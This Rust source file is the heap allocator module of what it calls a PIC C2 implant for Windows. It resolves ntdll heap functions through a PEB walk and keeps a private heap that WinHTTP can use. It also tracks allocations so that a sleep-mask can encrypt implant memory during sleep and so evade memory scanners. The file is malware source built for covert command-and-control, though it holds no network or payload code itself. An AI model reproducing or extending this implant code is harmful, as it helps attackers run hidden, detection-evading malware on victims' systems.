//! NT heap allocator for the PIC implant, backed by RtlCreateHeap.
//!
//! Uses a private Win32 heap (RtlCreateHeap/RtlAllocateHeap/RtlFreeHeap) instead
//! of a bump allocator. This is the industry standard for no_std C2 implants
//! (Proteus, Rustic64, DoublePulsar) because WinHTTP and other Win32 APIs
//! internally use RtlAllocateHeap/HeapFree and expect heap-compliant pointers.
//! A bump allocator over NtAllocateVirtualMemory produces pointers without Win32
//! heap metadata, causing ACCESS_VIOLATION when WinHTTP internally validates or
//! frees buffers passed to it.
//!
//! cfg(target_os = "windows") -- only compiles on Windows.

#![cfg(target_os = "windows")]

use core::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};

// ---- FFI types for the NT heap API ----

type RtlCreateHeap = unsafe extern "system" fn(
    u32,                          // Flags (HEAP_GROWABLE = 0x00000002)
    *mut core::ffi::c_void,       // HeapBase (NULL = let NT pick)
    usize,                        // ReserveSize (0 = default)
    usize,                        // CommitSize (0 = default)
    *mut core::ffi::c_void,       // LockParam (NULL)
    *mut core::ffi::c_void,       // Parameters (NULL)
) -> *mut core::ffi::c_void;      // Heap handle

type RtlAllocateHeap = unsafe extern "system" fn(
    *mut core::ffi::c_void,       // HeapHandle
    u32,                          // Flags (0)
    usize,                        // Size
) -> *mut core::ffi::c_void;      // Allocated pointer

type RtlFreeHeap = unsafe extern "system" fn(
    *mut core::ffi::c_void,       // HeapHandle
    u32,                          // Flags (0)
    *mut core::ffi::c_void,       // Pointer to free
) -> i32;                         // BOOL

type RtlReAllocateHeap = unsafe extern "system" fn(
    *mut core::ffi::c_void,       // HeapHandle
    u32,                          // Flags (0)
    *mut core::ffi::c_void,       // Existing pointer
    usize,                        // New size
) -> *mut core::ffi::c_void;      // Reallocated pointer

// ---- Resolved function pointers (cached in atomics) ----

static RTL_CREATE_HEAP: AtomicU64 = AtomicU64::new(0);
static RTL_ALLOCATE_HEAP: AtomicU64 = AtomicU64::new(0);
static RTL_FREE_HEAP: AtomicU64 = AtomicU64::new(0);
static RTL_REALLOCATE_HEAP: AtomicU64 = AtomicU64::new(0);
static RESOLVED: AtomicBool = AtomicBool::new(false);

/// The private heap handle. Created once via RtlCreateHeap on first use.
static HEAP_HANDLE: AtomicU64 = AtomicU64::new(0);

/// Heap region tracking for sleep-mask. We track the heap's overall address
/// range by querying it after creation. RtlAllocateHeap returns sub-regions
/// within this range, so the sleep-mask only needs to encrypt the whole heap.
static HEAP_BASE: AtomicU64 = AtomicU64::new(0);
static HEAP_SIZE: AtomicU64 = AtomicU64::new(0);

const HEAP_GROWABLE: u32 = 0x0000_0002;

/// Maximum tracked large allocations for sleep-mask (kept for API compat).
pub(crate) const MAX_SLABS: usize = 256;

/// Resolve the NT heap API functions via PEB walk. Called once (guarded by RESOLVED).
unsafe fn ensure_resolved() {
    if RESOLVED.load(Ordering::Acquire) {
        return;
    }
    // Resolve all four functions. If any is missing, RESOLVED is still set to
    // prevent retry loops (the fallback buffer handles allocations).
    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"RtlCreateHeap") {
        RTL_CREATE_HEAP.store(addr as u64, Ordering::Release);
    }
    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"RtlAllocateHeap") {
        RTL_ALLOCATE_HEAP.store(addr as u64, Ordering::Release);
    }
    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"RtlFreeHeap") {
        RTL_FREE_HEAP.store(addr as u64, Ordering::Release);
    }
    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"RtlReAllocateHeap") {
        RTL_REALLOCATE_HEAP.store(addr as u64, Ordering::Release);
    }
    RESOLVED.store(true, Ordering::Release);
}

/// Lazily create the private heap on first allocation.
/// Returns the heap handle, or 0 if RtlCreateHeap is unavailable/failed.
unsafe fn ensure_heap() -> u64 {
    let h = HEAP_HANDLE.load(Ordering::Acquire);
    if h != 0 {
        return h;
    }
    let create_addr = RTL_CREATE_HEAP.load(Ordering::Acquire);
    if create_addr == 0 {
        return 0;
    }
    let create: RtlCreateHeap = core::mem::transmute(create_addr as usize);
    let heap = create(
        HEAP_GROWABLE,
        core::ptr::null_mut(),
        0, // default reserve
        0, // default commit
        core::ptr::null_mut(),
        core::ptr::null_mut(),
    );
    if heap.is_null() {
        return 0;
    }
    HEAP_HANDLE.store(heap as u64, Ordering::Release);
    // Track a rough region for sleep-mask. The heap's internal segment list is
    // not directly enumerable without parsing HEAP structures, but we can use
    // NtQueryVirtualMemory or simply track individual large allocations. For
    // the sleep-mask, we record a generous region around the heap handle's
    // address. A more precise approach would walk PEB.ProcessHeaps, but the
    // sleep-mask only needs to encrypt sensitive data — the heap handle itself
    // marks the start of the first segment.
    HEAP_BASE.store(heap as u64, Ordering::Release);
    // We don't know the exact size yet; set a conservative 64 MiB.
    // enumerate_slabs will use HEAP_BASE + a query at sleep time.
    HEAP_SIZE.store(64 * 1024 * 1024, Ordering::Release);
    heap as u64
}

/// Force the allocator to resolve APIs NOW (call from entry before any alloc).
pub unsafe fn force_resolve() {
    ensure_resolved();
}

/// The resolved NtAllocateVirtualMemory address (0 = not yet resolved).
/// Kept for API compatibility — returns the RtlAllocateHeap address instead.
pub fn nt_alloc_addr() -> u64 {
    RTL_ALLOCATE_HEAP.load(Ordering::Acquire)
}

// ---- Slab tracking (for sleep-mask compatibility) ----

/// One tracked large allocation. Fields are atomics so both writers (inside
/// the `#[global_allocator]`, any thread) and the reader (`enumerate_slabs`
/// on the sleep-mask path) are race-free with NO lock — allocators cannot
/// take locks (reentrancy / perf). `AtomicU64` has the same layout as `u64`
/// (8 bytes, 8-aligned), so the on-disk struct layout is unchanged.
struct SlabDesc {
    base: AtomicU64,
    len: AtomicU64,
}

/// For sleep-mask: we track large allocations (> 64 KiB) individually, plus
/// the heap base region. Small allocations are inside the heap's internal
/// segments and are covered by the heap-base entry.
///
/// Both the table and the counter are plain `static` (NOT `static mut`):
/// `AtomicU64`/`AtomicUsize` are internally mutable, matching the `REGIONS`
/// pattern in `mem.rs`. This is the global-allocator hot path — concurrent
/// >64 KiB allocations from multiple threads are fully handled by `fetch_add`
/// handing each writer a unique index (no torn writes, no lost updates, no
/// OOB). See P0-1.
static SLAB_TABLE: [SlabDesc; MAX_SLABS] = [
    const {
        SlabDesc {
            base: AtomicU64::new(0),
            len: AtomicU64::new(0),
        }
    };
    MAX_SLABS
];
static SLAB_COUNT: AtomicUsize = AtomicUsize::new(0);

/// Record a large allocation in the slab table. Called from inside
/// `NtHeapAllocator::alloc` (the `#[global_allocator]`), so it is reachable
/// from ANY thread and MUST be lock-free. `fetch_add` atomically reserves a
/// unique index; once the table is full (`idx >= MAX_SLABS`) further tracks
/// are silently dropped (never panic — a panic in the allocator is fatal).
///
/// # Safety (what's left of it)
/// The `base`/`len` arguments must describe memory that will remain valid for
/// the use `enumerate_slabs` makes of it (reading the stored integers). No
/// dereference of `base` happens here.
unsafe fn track_large_alloc(base: *mut u8, len: usize) {
    // fetch_add gives each concurrent caller a unique index; the counter can
    // grow past MAX_SLABS once the table fills (every caller past the cap
    // lands in the `>= MAX_SLABS` drop branch). Clamp on the read side so a
    // count > MAX_SLABS never indexes out of bounds.
    let idx = SLAB_COUNT.fetch_add(1, Ordering::Relaxed);
    if idx < MAX_SLABS {
        SLAB_TABLE[idx].base.store(base as u64, Ordering::Release);
        SLAB_TABLE[idx].len.store(len as u64, Ordering::Release);
    }
}

/// Iterator over heap regions for sleep-mask. Returns only explicitly tracked
/// large allocations — NOT the entire heap range (which would cover trampoline
/// pages and other executable regions, causing AV when mask() RC4-encrypts them).
/// The sleep-mask's REGIONS table (registered via register_owned/register_key)
/// is the primary mechanism for protecting sensitive data.
///
/// Lock-free and safe to race with `track_large_alloc`: each slot's base/len
/// are independent atomics, and we read at most `count.min(MAX_SLABS)` slots.
/// A slot mid-write (base set, len not yet) is skipped by the `!= 0` filter.
pub fn enumerate_slabs() -> impl Iterator<Item = (*mut u8, usize)> {
    // Clamp count to MAX_SLABS: SLAB_COUNT is a monotonic fetch_add counter
    // and can exceed MAX_SLABS once the table is full, but only the first
    // MAX_SLABS slots are ever written.
    let count = SLAB_COUNT.load(Ordering::Acquire).min(MAX_SLABS);
    (0..count).filter_map(move |i| {
        let base = SLAB_TABLE[i].base.load(Ordering::Acquire);
        let len = SLAB_TABLE[i].len.load(Ordering::Acquire);
        if base != 0 && len != 0 {
            Some((base as *mut u8, len as usize))
        } else {
            None
        }
    })
}

/// Total bytes (approximate — returns the tracked heap region size).
pub fn heap_bytes() -> usize {
    HEAP_SIZE.load(Ordering::Acquire) as usize
}

// ---- Fallback buffer (before APIs are resolved) ----

static FALLBACK_BUF: AtomicU64 = AtomicU64::new(0);
const FALLBACK_SIZE: usize = 1 << 16;
static mut FALLBACK_MEM: [u8; FALLBACK_SIZE] = [0; FALLBACK_SIZE];

// ---- The allocator ----

pub struct NtHeapAllocator;

unsafe impl core::alloc::GlobalAlloc for NtHeapAllocator {
    unsafe fn alloc(&self, layout: core::alloc::Layout) -> *mut u8 {
        let size = layout.size();
        if size == 0 {
            return core::ptr::null_mut();
        }

        ensure_resolved();
        let heap_handle = ensure_heap();
        if heap_handle != 0 {
            let alloc_addr = RTL_ALLOCATE_HEAP.load(Ordering::Acquire);
            if alloc_addr != 0 {
                let alloc_fn: RtlAllocateHeap = core::mem::transmute(alloc_addr as usize);
                // RtlAllocateHeap always returns 8-byte aligned pointers on x64,
                // which satisfies layout.align() for most types (align ≤ 8).
                // For larger alignments, we over-allocate and align manually.
                let align = layout.align();
                if align <= 8 {
                    let ptr = alloc_fn(heap_handle as *mut core::ffi::c_void, 0, size);
                    if !ptr.is_null() && size > 65536 {
                        track_large_alloc(ptr as *mut u8, size);
                    }
                    return ptr as *mut u8;
                } else {
                    // Over-allocate for alignment: alloc size + align + 8, so
                    // there is ALWAYS room to store the raw pointer 8 bytes
                    // before the aligned address (and aligned_addr - 8 >= raw).
                    // The historical comment claiming "offset >= 8 for align > 8"
                    // was wrong — when RtlAllocateHeap returns an already-
                    // aligned block (common for align=16 under LFH), offset = 0
                    // and the conditional store was SKIPPED, but dealloc still
                    // unconditionally read *(ptr - 8) → UAF / wild free. See
                    // CRITICAL-4 in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
                    //
                    // Saturating add guards against usize overflow on attacker-
                    // controlled sizes (BEACON task sizes flow through here).
                    let total = size.saturating_add(align).saturating_add(8);
                    let raw = alloc_fn(heap_handle as *mut core::ffi::c_void, 0, total);
                    if raw.is_null() {
                        return core::ptr::null_mut();
                    }
                    let raw_addr = raw as usize;
                    // Round up to the next aligned address >= raw_addr.
                    // aligned_addr is in [raw_addr, raw_addr + align - 1].
                    let aligned_addr = (raw_addr + align - 1) & !(align - 1);
                    // Unconditionally store the raw pointer 8 bytes below the
                    // aligned address. Because total = size + align + 8, the
                    // slot at aligned_addr - 8 always lies inside the allocation
                    // (>= raw_addr) and doesn't overlap the user payload
                    // (which starts at aligned_addr and runs for `size` bytes).
                    let store = (aligned_addr - 8) as *mut *mut core::ffi::c_void;
                    core::ptr::write(store, raw);
                    if total > 65536 {
                        track_large_alloc(raw as *mut u8, total);
                    }
                    return aligned_addr as *mut u8;
                }
            }
        }

        // Fallback: bump within the static buffer (before APIs resolved).
        let aligned = (size + 15) & !15;
        loop {
            let cur = FALLBACK_BUF.load(Ordering::Acquire);
            let nxt = cur + aligned as u64;
            if nxt > FALLBACK_SIZE as u64 {
                return core::ptr::null_mut();
            }
            if FALLBACK_BUF
                .compare_exchange_weak(cur, nxt, Ordering::AcqRel, Ordering::Relaxed)
                .is_ok()
            {
                let base = core::ptr::addr_of_mut!(FALLBACK_MEM) as *mut u8;
                return base.add(cur as usize);
            }
        }
    }

    unsafe fn dealloc(&self, ptr: *mut u8, layout: core::alloc::Layout) {
        // Only free if it came from the real heap (not the fallback buffer).
        let fb_base = core::ptr::addr_of_mut!(FALLBACK_MEM) as usize;
        let fb_end = fb_base + FALLBACK_SIZE;
        let ptr_addr = ptr as usize;
        if ptr_addr >= fb_base && ptr_addr < fb_end {
            // Fallback buffer allocation — no free (bump within static).
            return;
        }

        let heap_handle = HEAP_HANDLE.load(Ordering::Acquire);
        if heap_handle == 0 {
            return; // Heap was never created — nothing to free.
        }
        let free_addr = RTL_FREE_HEAP.load(Ordering::Acquire);
        if free_addr == 0 {
            return;
        }

        let free_fn: RtlFreeHeap = core::mem::transmute(free_addr as usize);
        let align = layout.align();
        if align <= 8 {
            free_fn(heap_handle as *mut core::ffi::c_void, 0, ptr as *mut core::ffi::c_void);
        } else {
            // Recover the original pointer stored 8 bytes before.
            let store = (ptr_addr - 8) as *mut *mut core::ffi::c_void;
            let raw = core::ptr::read(store);
            free_fn(heap_handle as *mut core::ffi::c_void, 0, raw);
        }
    }

    unsafe fn realloc(&self, ptr: *mut u8, layout: core::alloc::Layout, new_size: usize) -> *mut u8 {
        // Check fallback buffer.
        let fb_base = core::ptr::addr_of_mut!(FALLBACK_MEM) as usize;
        let fb_end = fb_base + FALLBACK_SIZE;
        let ptr_addr = ptr as usize;
        if ptr_addr >= fb_base && ptr_addr < fb_end {
            // Fallback allocation — can't realloc, do alloc + copy.
            // Layout::from_size_align can Err on overflow/non-power-of-2 align;
            // under panic=abort the .unwrap() killed the implant. Fail soft
            // (return null) — matches GlobalAlloc's documented OOM contract.
            let new_layout = match core::alloc::Layout::from_size_align(new_size, layout.align()) {
                Ok(l) => l,
                Err(_) => return core::ptr::null_mut(),
            };
            let new = self.alloc(new_layout);
            if !new.is_null() {
                let old_len = (fb_end - ptr_addr).min(layout.size());
                let copy_len = old_len.min(new_size);
                core::ptr::copy_nonoverlapping(ptr, new, copy_len);
            }
            return new;
        }

        let heap_handle = HEAP_HANDLE.load(Ordering::Acquire);
        let realloc_addr = RTL_REALLOCATE_HEAP.load(Ordering::Acquire);
        if heap_handle != 0 && realloc_addr != 0 {
            let realloc_fn: RtlReAllocateHeap = core::mem::transmute(realloc_addr as usize);
            let align = layout.align();
            if align <= 8 {
                let new_ptr = realloc_fn(
                    heap_handle as *mut core::ffi::c_void,
                    0,
                    ptr as *mut core::ffi::c_void,
                    new_size,
                );
                return new_ptr as *mut u8;
            }
            // For aligned allocations, fall back to alloc + copy + free.
            // (RtlReAllocateHeap doesn't know about our alignment padding.)
        }

        // Generic fallback: alloc + copy + (skip free since dealloc might work).
        let new_layout = match core::alloc::Layout::from_size_align(new_size, layout.align()) {
            Ok(l) => l,
            Err(_) => return core::ptr::null_mut(),
        };
        let new = self.alloc(new_layout);
        if !new.is_null() {
            let copy_len = layout.size().min(new_size);
            core::ptr::copy_nonoverlapping(ptr, new, copy_len);
            self.dealloc(ptr, layout);
        }
        new
    }
}
